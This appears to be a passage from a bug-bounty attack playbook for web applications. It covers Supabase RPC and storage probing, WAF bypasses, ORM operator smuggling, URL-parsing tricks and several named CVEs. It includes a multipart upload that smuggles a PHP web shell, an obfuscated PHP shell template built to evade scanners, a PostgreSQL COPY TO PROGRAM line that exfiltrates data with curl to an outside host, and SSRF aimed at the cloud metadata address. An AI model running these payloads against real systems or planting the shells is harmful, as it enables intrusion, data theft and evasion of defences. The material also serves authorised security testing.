### RPC / SECURITY DEFINER privilege escalation

```bash
# SECURITY DEFINER functions run as the OWNER, not the caller -- RLS on
# tables they touch is NOT enforced unless the function body re-checks
# auth.uid() itself. Call with lowest-priv token; compare to direct REST access.
curl -s -X POST "$URL/rest/v1/rpc/<function_name>" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -d '{"param":"value"}'

# SQLi inside a DEFINER function using dynamic SQL (EXECUTE format('...%s...', x))
# — same payloads as the SQLi section above, sink is Postgres EXECUTE.
```

### Storage bucket enumeration

```bash
curl -s "$URL/storage/v1/bucket" -H "apikey: $ANON_KEY"
curl -s "$URL/storage/v1/object/public/<bucket>/<path>"
```

### Never-submit note

RLS enabled with zero policies fails CLOSED (blocks everything) — that is a
UX bug, not a vulnerability. The `anon` key visible in client JS is by design.
Only `service_role` exposure and an actually-permissive/missing policy are
findings.

## Ported Payload Clusters (ported from Orwa workspace)

### WAF bypass — multipart `boundary*0`
A WAF that parses `boundary` strictly while the app parses it loosely (or
vice-versa) disagree on a smuggled `boundary*0=...` continued parameter:
```
Content-Type: multipart/form-data; boundary=X
...
--X
Content-Disposition: form-data; name="file"; filename="x.php"

<?php system($_GET[0]); ?>
--X
boundary*0=Y
--X--
```
The `boundary*0` parameter is an RFC-2231-style continued parameter many WAFs
ignore while the app's multipart library honors the continued boundary.

### ORM/ODM operator smuggling
When user input reaches an ORM/ODM query as a field/operator rather than a
value, smuggle the comparison operator itself:
- Prisma: `resetToken: { not: null }` instead of a literal token.
- Django: `password__startswith=...`, `id__in=...` via an over-permissive filter set.
- Ransack: `q[user_password_cont]=...`, `q[s]`/`q[m]` sort/match injection.
- Sequelize: `where: { id: { [Op.ne]: 0 } }`.
- OData: `$filter=startswith(Password,'x')` / `$filter=1 eq 1`.

### JSON-as-SQL WAF bypass (Team82)
Encode SQL inside JSON so the WAF sees no SQL tokens and the DB normalizes them
out: `{"x":{"$gt":""}}`-style keys, `or`-escaped keywords, or a
`{"a":1,"a":2}` duplicate-key trick that a JSON-aware DB driver folds into a
query the WAF never saw.

### CSPT → XSS/CSRF/cache-deception
Client-Side Path Traversal escalation payloads: use the traversed path to reach
a reflected sink (→ XSS), a state-changing endpoint (→ CSRF), or a cacheable
static route (→ cache deception). Anchor each on the specific sink the SPA
builds from the traversed segment.

### FortiWeb CVE-2025-25257
Pre-auth SQL injection to RCE in the FortiWeb Fabric Connector (FG-IR-25-151):
a crafted request reaches the connector's DB sink without authentication. (The
adjacent auth-bypass case is CVE-2025-64446.) Vendor-WAF bug, not a target-app
bug — reportable only on FortiWeb itself.

### PostgreSQL `COPY TO PROGRAM` OOB
With an injectable PostgreSQL statement and a superuser/`pg_execute_server_program`
role, exfil out-of-band: `COPY (SELECT ...) TO PROGRAM 'curl http://oast/$(...)'`
or `COPY ... TO PROGRAM 'nslookup $(SELECT ...).oast'` — for data that
time-based channels are too slow to pull.

### ClickHouse→PostgreSQL (PostHog ZDI-25-099)
Cross-engine query injection: a ClickHouse input that reaches the PostgreSQL
engine (PostHog-style multi-store) lets you escalate a ClickHouse-only
injection into PostgreSQL syntax, or vice-versa — after confirming which engine
a sink actually hits, probe the union of both engines' functions.

### Magento deserialization gadget chains
CosmicSting (CVE-2024-34102) and SessionReaper (CVE-2025-54236): CosmicSting is
an XXE reached through Magento's serialized-data path, while SessionReaper is
the nested-deserialization chain, where an inner object's magic method is
reached through an outer object the app trusts. Test deserialization of
loose-type `Object`-shaped payloads where the type hint is not pinned to a safe
class.

### PDO `EMULATE_PREPARES` / HY093
`PDO::ATTR_EMULATE_PREPARES` re-embeds parameters into one quoted string, and
multibyte-encoding / HY093 (mixed charset) edge cases break that quoting, so a
parameter the driver "prepared" is actually injected. Probe multibyte and
`\0`-terminated inputs when the app uses PDO emulation on a non-UTF8 connection.

### Keycloak `redirect_uri` oracle
Keycloak's `redirect_uri` validation differential: a URI the validator accepts
on one path but the token/redirect logic handles differently (whitespace, `@`,
`//`, scheme-less, or an allowed-subdomain trick) leaks an open-redirect or
code-leak oracle. Diff `redirect_uri` handling between the auth endpoint and
the token endpoint.

### Response-manipulation auth bypass
When an intermediary lets you rewrite the response (header injection →
`Set-Cookie`, or a proxy honoring `X-HTTP-Method-Override`/`X-Original-URL` for
the auth decision), rewrite the auth response to bypass the gate — drop the
`WWW-Authenticate`/redirect, or force a 200 on a login gate.

### WHATWG `.%09.` URL normalization
WHATWG URL parsing treats `.` + tab (`.%09`) and other whitespace-dot sequences
differently from server-side parsers, so `http://x/%2e%09/../admin` or a
tab-padded dot segment slips past an allowlist that only strips plain `../`.
Test `.%09`, `. %09`, `%2e%09`, and tab/CR variants.

### Single-slash protocol confusion
`//` vs `/` protocol-relative parsing: a URL beginning `//host/path` is treated
as protocol-relative by one parser and as an absolute path by another, so a
redirect/allowlist that checks scheme/domain differently than the fetcher can be
steered to `//evil.com`. Test `//`-prefixed targets in redirects and SSRF
allowlists.

### XOR-obfuscated PHP shell
A PHP one-liner whose strings are XOR/rot13/base64-obfuscated survives
string-grep scanners (keyword/backdoor signatures) yet still evaluates:
```
<?php $_=base64_decode("..."); $f=str_rot13("..."); @$f($_POST[0]); ?>
```
Generic shape: build `system`/`assert`/`$_POST` strings at runtime from
XOR/rot13/base64 so no static token matches a scanner signature.

### PDF-generator SSRF (WeasyPrint / PD4ML)
SSRF through PDF renderers: a URL/HTML field rendered to PDF by WeasyPrint or
PD4ML triggers a server-side fetch of an embedded `<img src=...>`,
`<link href=...>`, or data/URL object — point it at
`http://169.254.169.254/...` or an internal host and confirm the request in the
generated PDF or a callback.


